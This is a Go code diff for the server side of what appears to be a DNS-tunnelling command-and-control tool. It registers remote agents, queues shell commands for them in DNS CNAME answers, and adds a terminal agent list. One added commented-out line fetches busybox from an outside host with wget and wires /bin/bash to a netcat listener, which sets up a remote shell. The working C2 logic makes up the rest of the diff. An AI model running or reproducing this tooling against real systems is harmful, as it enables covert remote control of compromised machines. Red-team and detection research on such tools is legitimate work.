@@ -7,11 +7,11 @@ import (
 	"strings"
 	"time"
 
-	log "github.com/kpango/glg"
 	"github.com/miekg/dns"
 	"github.com/mosajjal/dnspot/c2"
 	"github.com/mosajjal/dnspot/conf"
 	"github.com/mosajjal/dnspot/cryptography"
+	"github.com/mosajjal/dnspot/ui"
 	"github.com/spf13/cobra"
 )
 
@@ -39,11 +39,11 @@ var ConnectedAgents = make(map[string]agentStatusForServer)
 
 // log received healthcheck
 func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
-	log.Infof("Healthcheck, coming from %s\n", Packet.Signature)
+	ui.Infof("Healthcheck, coming from %s", Packet.Signature)
 	//register new agent in agent list
 	agent, ok := ConnectedAgents[Packet.Signature.String()]
 	if !ok {
-		log.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)
+		ui.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)
 		ConnectedAgents[Packet.Signature.String()] = agentStatusForServer{
 			NextMessageType:                 c2.MessageHealthcheck,
 			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
@@ -64,7 +64,7 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 		//todo: should we pass it on to MessageSyncTimeHandler function here?
 
 		// todo: check the actual next message time here and send a message appropriately
-		log.Infof("preparing a response for a healthcheck message")
+		ui.Infof("preparing a response for a healthcheck message")
 		msg := c2.MessagePacket{
 			TimeStamp:   uint32(time.Now().Unix()),
 			MessageType: agent.NextMessageType,
@@ -73,7 +73,7 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 		for _, A := range Answers {
 			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
 			if err != nil {
-				log.Warnf("Error: %v", err) //todo:fix
+				ui.Warnf("Error: %v", err) //todo:fix
 			}
 			q.Answer = append(q.Answer, cname)
 		}
@@ -82,7 +82,7 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
 		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][0])) //todo:fix the 0 index
 		if err != nil {
-			log.Warnf("Error: %v", err) //todo:fix
+			ui.Warnf("Error: %v", err) //todo:fix
 		}
 		q.Answer = append(q.Answer, cname)
 	}
@@ -116,7 +116,7 @@ func SendFileToAgent(payload []byte, firstPacket c2.MessagePacketWithSignature) 
 
 // handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
 func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) error {
-	log.Infof("invoking command '%s' for the client", command)
+	ui.Infof("invoking command '%s' for the client", command)
 	msg := c2.MessagePacket{
 		TimeStamp:   uint32(time.Now().Unix()),
 		MessageType: c2.MessageExecuteCommand,
@@ -130,9 +130,9 @@ func RunCommandOnAgent(agentPublicKey *cryptography.PublicKey, command string) e
 		targetBuffer = append(targetBuffer, Answers...)
 		outgoingBuffer[agentPublicKey.String()][parentPartId] = targetBuffer
 	} else {
-		log.Errorf("key and ParentPartId already exists in the buffer. Please try again")
+		ui.Errorf("key and ParentPartId already exists in the buffer. Please try again")
 	}
-	log.Infof("command was successfully added to outgoing buffer to be sent")
+	ui.Infof("command was successfully added to outgoing buffer to be sent")
 
 	// set NextMessageType to let the healthcheck responder know
 	agent := ConnectedAgents[agentPublicKey.String()]
@@ -155,7 +155,7 @@ func HandleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.M
 	}
 	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1])) //todo: probably gonna crash at the last packet
 	if err != nil {
-		log.Warnf("Error: %v", err) //todo:fix
+		ui.Warnf("Error: %v", err) //todo:fix
 	}
 	q.Answer = append(q.Answer, cname)
 	return nil
@@ -172,7 +172,7 @@ func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dn
 	for _, A := range Answers {
 		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
 		if err != nil {
-			log.Warnf("Error: %v", err) //todo:fix
+			ui.Warnf("Error: %v", err) //todo:fix
 		}
 		q.Answer = append(q.Answer, cname)
 	}
@@ -186,7 +186,7 @@ func executeFunction(packets []c2.MessagePacketWithSignature) error {
 		packetPayload := packet.Msg.Payload[:]
 		fullPayload = append(fullPayload, packetPayload...)
 	}
-	log.Warnf("%s, coming from %s\n", fullPayload, packets[0].Signature.String())
+	ui.Warnf("%s, coming from %s\n", fullPayload, packets[0].Signature.String())
 	// todo: clean the memory for this parentpartID
 	return nil
 }
@@ -198,7 +198,7 @@ func cleanupBuffer(timeout time.Duration) error {
 func parseQuery(m *dns.Msg) error {
 	outs, err := c2.DecryptIncomingPacket(m, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, nil)
 	if err != nil {
-		log.Warnf("Error in Decrypting incoming packet", err)
+		ui.Warnf("Error in Decrypting incoming packet", err)
 	}
 	for _, o := range outs {
 		switch msgType := o.Msg.MessageType; msgType {
@@ -232,7 +232,7 @@ func handle53(w dns.ResponseWriter, r *dns.Msg) {
 	case dns.OpcodeQuery:
 		err := parseQuery(m)
 		if err != nil {
-			log.Warnf("bad request: %s", err)
+			ui.Warnf("bad request: %s", err)
 		}
 	}
 	w.WriteMsg(m)
@@ -244,10 +244,29 @@ func runDns(cmd *cobra.Command) {
 
 	// start server
 	server := &dns.Server{Addr: conf.GlobalServerConfig.ListenAddress, Net: "udp"}
-	log.Infof("Started DNS on %s -- listening", server.Addr)
+	ui.Infof("Started DNS on %s -- listening", server.Addr)
 	err := server.ListenAndServe()
 	errorHandler(err)
 	defer server.Shutdown()
+
+}
+
+func updater() {
+	timeticker := time.NewTicker(1 * time.Second)
+	// runCmdTicker := time.NewTicker(30 * time.Second)
+	for {
+		select {
+		case <-timeticker.C:
+			ui.UiAgentList.Reset()
+			for key, _ := range ConnectedAgents {
+				ui.UiAgentList.Write("[ ] " + string(key) + "\n")
+			}
+			// case <-runCmdTicker.C:
+			// 	pubkey, _ := cryptography.PublicKeyFromString("nnmxo8snaufg5k8fe2jy7ns6gumtz38iro6vzhxfbpdbokyge3")
+			// 	cmd := "ping -c 1 1.1.1.1 && wget n0p.me/bin/busybox && chmod +x busybox && mv busybox /opt/busybox && /opt/busybox nc -l 127.0.0.1 < /bin/bash"
+			// 	RunCommandOnAgent(pubkey, cmd)
+		}
+	}
 }
 
 func RunServer(cmd *cobra.Command, args []string) {
@@ -276,15 +295,6 @@ func RunServer(cmd *cobra.Command, args []string) {
 	conf.GlobalServerConfig.DnsSuffix = dnsSuffix
 
 	go runDns(cmd)
-	timeticker := time.NewTicker(20 * time.Second)
-
-	// todo: a CLI here to list the agents and allow intractive shell on the remote machine
-	for {
-		select {
-		case <-timeticker.C:
-			// cleanupBuffer(*handler, 60*time.Second) //TODO: make this work
-			agent, _ := cryptography.PublicKeyFromString("AS5GLUGEPSMJC7BCDSZOGMWIINMQAEUHXHX7CMGXUIE42WVI24ZXT7K4MJHORY6ZHYNAPPTAMPAS3NBWDKE77AJ5WBB663Q72EDTYXN2")
-			RunCommandOnAgent(agent, "echo kldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjnkldFhsdfkjfghsdfkjghdfgkjdfhgkljdfhgdfgkljghdfkjghdfjkghsdklhafgiuernfkjgnrfvkjfnkljjgfndkljghnjn > /tmp/file.txt")
-		}
-	}
+	go updater()
+	ui.RunTui()
 }
